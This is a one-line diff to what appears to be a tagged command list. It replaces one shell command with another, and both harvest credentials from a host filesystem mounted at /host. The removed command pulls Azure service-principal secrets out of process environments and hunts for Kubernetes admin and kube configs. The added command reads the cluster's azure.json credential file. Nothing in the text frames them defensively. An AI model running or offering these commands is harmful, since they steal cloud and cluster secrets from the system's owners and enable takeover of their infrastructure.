@@ -1,1 +1,1 @@
-cat /host/proc/*/environ 2>/dev/null | tr "\0" "\n" | grep -iE "AZURE|ARM_|SP_|TENANT|SUBSCRIPTION|CLIENT_ID|CLIENT_SECRET" | sort -u | head -20; echo ---; ls /host/etc/kubernetes/admin.conf 2>/dev/null; cat /host/root/.kube/config 2>/dev/null | head -10; echo ---; find /host/var/lib/rancher -name "*.yaml" 2>/dev/null | head -5; find /host/home -name ".kube" -type d 2>/dev/null # SEA2-AZURE
+cat /host/etc/kubernetes/azure.json 2>/dev/null | head -30 # SEA2-AZJSON
